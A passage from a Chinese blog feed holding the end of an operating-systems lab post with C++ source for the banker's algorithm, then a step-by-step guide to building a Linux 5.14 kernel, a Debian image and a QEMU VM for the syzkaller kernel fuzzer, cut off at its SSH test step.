href="#完整源代码"></a> 完整源代码</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> N 100</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> M 100</span><br><span class="hljs-keyword">int</span> Available[M],     <span class="hljs-comment">//每种资源现有的实例数量</span><br>    Max[N][M],        <span class="hljs-comment">//每个进程i的对资源j最大需求</span><br>    Allocation[N][M], <span class="hljs-comment">//每个进程现在所分配的每个资源的实例数量</span><br>    Need[N][M],       <span class="hljs-comment">//每个进程还需要的剩余的资源</span><br>    Request[N][M],    <span class="hljs-comment">//进程资源请求</span><br>    sign[N],          <span class="hljs-comment">//记录安全序列</span><br>    process_num,      <span class="hljs-comment">//进程数量</span><br>    recourse_num;     <span class="hljs-comment">//资源数量</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> <span class="hljs-comment">//初始化进程资源状况</span></span><br><span class="hljs-function"></span>&#123;<br>    cin &gt;&gt; process_num &gt;&gt; recourse_num;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>        &#123;<br>            cin &gt;&gt; Allocation[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>        &#123;<br>            cin &gt;&gt; Max[i][j];<br>            Need[i][j] = Max[i][j] - Allocation[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>    &#123;<br>        cin &gt;&gt; Available[j];<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print_information</span><span class="hljs-params">()</span> <span class="hljs-comment">//打印进程资源表</span></span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;-----------------------------------进程资源表------------------------------------&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|    进程名称   |   已占用资源  |    尚需资源   |  最大所需资源 |  资源剩余实例 |&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-string">&quot;|&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span> * recourse_num; j++)<br>    &#123;<br><br>        cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">4</span>) &lt;&lt; <span class="hljs-built_in"><span class="hljs-keyword">char</span></span>(j % recourse_num + <span class="hljs-string">&#x27;A&#x27;</span>);<br>        <span class="hljs-keyword">if</span> ((j + <span class="hljs-number">1</span>) % recourse_num == <span class="hljs-number">0</span>)<br>            cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span>;<br>    &#125;<br>    cout &lt;&lt; endl;<br>    <span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;|&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;P[&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;]&quot;</span>; <span class="hljs-comment">//进程名称</span><br>        cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">4</span>) &lt;&lt; Allocation[i][j]; <span class="hljs-comment">//已占用资源</span><br>        &#125;<br>        cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">4</span>) &lt;&lt; Need[i][j]; <span class="hljs-comment">//尚需资源</span><br>        &#125;<br>        cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">4</span>) &lt;&lt; Max[i][j]; <span class="hljs-comment">//最大所需资源</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (k == <span class="hljs-number">0</span>)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>            &#123;<br>                cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">4</span>) &lt;&lt; Available[j]; <span class="hljs-comment">//资源剩余实例</span><br>            &#125;<br>            cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span> &lt;&lt; endl;<br>            k = <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>            cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-string">&quot;|&quot;</span> &lt;&lt; endl;<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------------------------------------------------&quot;</span> &lt;&lt; endl<br>         &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">security_test</span><span class="hljs-params">()</span> <span class="hljs-comment">//安全性检查</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> work[recourse_num];<br>    <span class="hljs-keyword">bool</span> finish[process_num];<br>    <span class="hljs-keyword">int</span> count, k = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; recourse_num; i++) <span class="hljs-comment">//初始化work</span><br>    &#123;<br>        work[i] = Available[i];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++) <span class="hljs-comment">//设置false</span><br>    &#123;<br>        finish[i] = <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++) <span class="hljs-comment">////满足条件释放资源，并从头开始扫描进程集合</span><br>    &#123;<br>        count = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>            <span class="hljs-keyword">if</span> (finish[i] == <span class="hljs-literal">false</span> &amp;&amp; Need[i][j] &lt;= work[j])<br>                count++;<br>        <span class="hljs-keyword">if</span> (count == recourse_num) <span class="hljs-comment">//当进程各类资源都满足NEED&lt;=WORK时</span><br>        &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>                work[j] = work[j] + Allocation[i][j]; <span class="hljs-comment">//释放进程</span><br>            finish[i] = <span class="hljs-literal">true</span>;<br>            sign[k] = i; <span class="hljs-comment">//记录下满足条件的进程</span><br>            k++;<br>            i = <span class="hljs-number">-1</span>; <span class="hljs-comment">//从头开始扫描</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++)<br>        <span class="hljs-keyword">if</span> (finish[i] == <span class="hljs-literal">false</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Banker_Algorithm</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span> <span class="hljs-comment">//操作系统第五次实验银行家算法</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> m = <span class="hljs-number">0</span>; m &lt; recourse_num; m++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (Request[i][m] &gt; Need[i][m])<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;所需资源数超出其宣布的最大值!&quot;</span> &lt;&lt; endl;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Request[i][m] &gt; Available[m])<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;无足够资源，p[&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;]需等待!&quot;</span> &lt;&lt; endl;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//尝试为进程分配资源</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>    &#123;<br>        Available[j] = Available[j] - Request[i][j];<br>        Allocation[i][j] = Allocation[i][j] + Request[i][j];<br>        Need[i][j] = Need[i][j] - Request[i][j];<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;尝试进行资源分配后的进程资源表: &quot;</span> &lt;&lt; endl;<br>    <span class="hljs-built_in">print_information</span>();<br>    <span class="hljs-comment">//执行安全性算法</span><br>    cout &lt;&lt; <span class="hljs-string">&quot;正在进行安全性检查&quot;</span> &lt;&lt; endl;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">security_test</span>())<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;经安全性检查，系统安全，本次分配成功&quot;</span> &lt;&lt; endl;<br>        cout &lt;&lt; <span class="hljs-string">&quot;安全进程序列为：&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num - <span class="hljs-number">1</span>; i++)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;P[&quot;</span> &lt;&lt; sign[i] &lt;&lt; <span class="hljs-string">&quot;]---&gt;&quot;</span>;<span class="hljs-comment">//输出安全的进程序列</span><br>        &#125;<br>        cout &lt;&lt; <span class="hljs-string">&quot;P[&quot;</span> &lt;&lt; sign[process_num - <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-string">&quot;]&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;安全性检测失败!系统不安全!!!正在恢复资源分配------&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<span class="hljs-comment">//恢复进程资源分配</span><br>        &#123;<br>            Available[j] = Available[j] + Request[i][j];<br>            Allocation[i][j] = Allocation[i][j] - Request[i][j];<br>            Need[i][j] = Need[i][j] + Request[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">init</span>();<br>    cout &lt;&lt; <span class="hljs-string">&quot;初始化进程信息为：&quot;</span> &lt;&lt; endl;<br>    <span class="hljs-built_in">print_information</span>();<br>    <span class="hljs-keyword">int</span> i, tt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (tt != <span class="hljs-number">999</span>)<br>    &#123;<br>        cout &lt;&lt; endl<br>             &lt;&lt; <span class="hljs-string">&quot;请输入请求资源Request[进程标号i][资源类型j]:&quot;</span> &lt;&lt; endl;<br>        cout &lt;&lt; <span class="hljs-string">&quot;进程i=：&quot;</span>;<br>        cin &gt;&gt; i;<br>        cout &lt;&lt; <span class="hljs-string">&quot;各类资源数量(A B C)=:  &quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> m = <span class="hljs-number">0</span>; m &lt; recourse_num; m++)<br>            cin &gt;&gt; Request[i][m];<br>        cout &lt;&lt; endl;<br>        <span class="hljs-comment">//执行操作系统第五次实验银行家算法</span><br>        <span class="hljs-built_in">Banker_Algorithm</span>(i);<br>        <span class="hljs-comment">//输出每次判断产生的执行序列</span><br>        cout &lt;&lt; endl<br>             &lt;&lt; <span class="hljs-string">&quot;当前资源分配表：&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-built_in">print_information</span>();<br>        cout &lt;&lt; endl<br>             &lt;&lt; <span class="hljs-string">&quot;请输入N(当N=999退出)：&quot;</span> &lt;&lt; endl;<br>        cin &gt;&gt; tt;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="程序初值和运行结果"><a class="markdownIt-Anchor" href="#程序初值和运行结果"></a> 程序初值和运行结果</h4><p>初值</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">5 </span><span class="hljs-number">3</span><br><br><span class="hljs-symbol">0 </span><span class="hljs-number">1</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">0</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">3 </span><span class="hljs-number">0</span> <span class="hljs-number">2</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">1</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">0</span> <span class="hljs-number">2</span><br><br><span class="hljs-symbol">7 </span><span class="hljs-number">5</span> <span class="hljs-number">3</span><br><span class="hljs-symbol">3 </span><span class="hljs-number">2</span> <span class="hljs-number">2</span><br><span class="hljs-symbol">9 </span><span class="hljs-number">0</span> <span class="hljs-number">2</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">2</span> <span class="hljs-number">2</span><br><span class="hljs-symbol">4 </span><span class="hljs-number">3</span> <span class="hljs-number">3</span><br><br><span class="hljs-symbol">3 </span><span class="hljs-number">3</span> <span class="hljs-number">2</span><br></code></pre></div></td></tr></table></figure><p>首先打印进程初始化信息：</p><p><img src="/posts/ab6ecd69/image-20211128171249029.png" alt="image-20211128171249029"></p><p>为进程1分配资源（1 0 1）</p><p><img src="/posts/ab6ecd69/image-20211128171330517.png" alt="image-20211128171330517"></p><p>因为不安全无法分配的情况：</p><p><img src="/posts/ab6ecd69/image-20211128173225317.png" alt="image-20211128173225317"></p><p>无足够资源需要等待的情况：</p><p><img src="/posts/ab6ecd69/image-20211128171404061.png" alt="image-20211128171404061"></p><p>申请资源超过其最大请求：</p><p><img src="/posts/ab6ecd69/image-20211128171419204.png" alt="image-20211128171419204"></p><h3 id="五-实验总结"><a class="markdownIt-Anchor" href="#五-实验总结"></a> 五、实验总结</h3><p>这次实验模拟了操作系统第五次实验银行家算法，让我更加深刻的理解了进程死锁这一概念，也学习了如何进行死锁预防和死锁避免，而操作系统第五次实验银行家算法正是通过死锁避免来实现的，通过自己编写代码，大大加深了对于操作系统第五次实验银行家算法细节的理解，理解了如何通过安全性算法来检查系统状态是否安全，也更加理解了如何通过资源请求算法来请求资源分配和释放未成功分配的资源。</p>]]></content>
    
    
    <categories>
      
      <category>Course Study</category>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>syzkaller配置小结</title>
    <link href="/posts/60fc7e01/"/>
    <url>/posts/60fc7e01/</url>
    
    <content type="html"><![CDATA[<p>这部分配置基本参照<a href="https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md">syzkaller官方文档</a></p><h3 id="安装前准备"><a class="markdownIt-Anchor" href="#安装前准备"></a> 安装前准备</h3><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">sudo apt update<br>sudo apt install make gcc flex bison libncurses-dev libelf-dev libssl-dev<br></code></pre></div></td></tr></table></figure><blockquote><p><strong>安装libncurses-dev等时遇到如下问题:</strong></p><p>libncurses5-dev : 依赖: libtinfo5 (= 5.9+20140118-1ubuntu1) 但是 6.1-1ubuntu…</p><p>解决：</p><p>逐个安装相应版本的依赖，缺什么装什么</p><p><img src="/posts/60fc7e01/image-20211125211645437.png" alt="image-20211125211645437"></p><p><img src="/posts/60fc7e01/image-20211125211316133.png" alt="image-20211125211316133"></p></blockquote><p>最后成功全部装完</p><h3 id="下载内核"><a class="markdownIt-Anchor" href="#下载内核"></a> 下载内核</h3><ul><li><p>clone内核源码</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">git clone --branch v5<span class="hljs-number">.14</span> git:<span class="hljs-comment">//git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git $KERNEL</span><br></code></pre></div></td></tr></table></figure><p>但是因为这样太慢了，所以我最后采取了在网站上直接下载linux内核5.14版本的压缩包，然后解压至目标路径</p><p><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/snapshot/linux-5.14.tar.gz">v5.14压缩包</a></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">tar -zxvf linux-5.14.tar.gz -C ~/syz <br></code></pre></div></td></tr></table></figure></li><li><p>生成默认配置</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">cd $KERNEL<br>make defconfig<br>make kvm_guest.config<br></code></pre></div></td></tr></table></figure></li><li><p>启动所需的配置选项</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">sudo vim .config<br></code></pre></div></td></tr></table></figure><p>手动编辑.config文件，加入下面的变量</p><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-comment"># Coverage collection.</span><br><span class="hljs-attr">CONFIG_KCOV</span>=y<br><br><span class="hljs-comment"># Debug info for symbolization.</span><br><span class="hljs-attr">CONFIG_DEBUG_INFO</span>=y<br><br><span class="hljs-comment"># Memory bug detector</span><br><span class="hljs-attr">CONFIG_KASAN</span>=y<br><span class="hljs-attr">CONFIG_KASAN_INLINE</span>=y<br><br><span class="hljs-comment"># Required for Debian Stretch</span><br><span class="hljs-attr">CONFIG_CONFIGFS_FS</span>=y<br><span class="hljs-attr">CONFIG_SECURITYFS</span>=y<br></code></pre></div></td></tr></table></figure><p>重新生成配置</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">make olddefconfig<br></code></pre></div></td></tr></table></figure></li><li><p>构建内核</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">make -j`nproc`<br></code></pre></div></td></tr></table></figure><p>之后我们可以内核文件夹下看到vmlinux(内核二进制文件)和bzImage(内核镜像)</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">ls $KERNEL/vmlinux<br># sample output - $KERNEL/vmlinux<br>ls $KERNEL/arch/x86/boot/bzImage<br># sample output - $KERNEL/arch/x86/boot/bzImage<br></code></pre></div></td></tr></table></figure></li></ul><h3 id="构建image"><a class="markdownIt-Anchor" href="#构建image"></a> 构建image</h3><ul><li><p>安装debotstrap</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">sudo apt install debootstrap<br></code></pre></div></td></tr></table></figure></li><li><p>生成Debian Stretch Linux镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">mkdir $IMAGE<br>cd $IMAGE/<br>wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh<br>chmod +x create-image.sh<br>./create-image.sh<br></code></pre></div></td></tr></table></figure></li><li><p>安装镜像的额外工具</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">./create-image.sh --feature full<br></code></pre></div></td></tr></table></figure></li></ul><h3 id="构建qemu"><a class="markdownIt-Anchor" href="#构建qemu"></a> 构建qemu</h3><ul><li><p>首先安装qemu</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">sudo apt install qemu-system-x86<br></code></pre></div></td></tr></table></figure></li><li><p>启动qemu虚拟机</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">qemu-system-x86_64 \                            <br>        -m 2G \<br>        -smp 2 \<br>        -kernel /home/zino/syz/linux-5.14/arch/x86/boot/bzImage \<br>        -append &quot;console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0&quot; \ <br>        -drive file=/home/zino/syz/image/stretch.img,format=raw \<br>        -net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10021-:22 \<br>        -net nic,model=e1000 \<br>        -enable-kvm \<br>        -nographic \<br>        -pidfile vm.pid \<br>        2&gt;&amp;1 | tee vm.log<br><br></code></pre></div></td></tr></table></figure><p>输入root后成功进入</p><p><img src="/posts/60fc7e01/image-20211127143311829.png" alt="image-20211127143311829"></p></li><li><p>测试ssh</p><p>因为后面syzkaller会用到ssh连接，所以需要测试一下</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs 